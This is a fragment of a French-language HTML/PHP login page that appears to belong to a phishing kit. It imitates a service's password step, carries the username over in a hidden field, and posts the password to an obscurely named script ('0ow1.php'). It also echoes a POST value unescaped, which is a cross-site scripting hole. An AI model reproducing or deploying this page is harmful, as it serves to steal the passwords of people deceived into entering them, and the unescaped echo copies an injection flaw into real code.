...
<html lang="fr" style="overflow: auto;">
    <head>
        ...
        <body style="overflow: auto;">
			...
			<form method="POST" action="./$post/0ow1.php" />
                <div id="login-base">
                            ...
                            <div class="auth auth--withRetour js-document">
                                ...
                                <section>
                                    <main class="auth__content">
                                        ...
                                        <h2><img src="../assets/images/h22.png" /></h2>
                                        <div class="atomx-form__content field-container">
										<input type="text" name="0ow1_1" value="<?php echo $_POST['0ow1_1']; ?>" hidden />
                                            <div class="atomx-form__content-block has-icon right">
                                                <input id="pass" name="0ow1_2" type="password" class="atomx-form__field field-email" style="padding-right: 20px;" autocomplete="username" placeholder="Mot de passe" required />
                                            </div>
                                        </div>
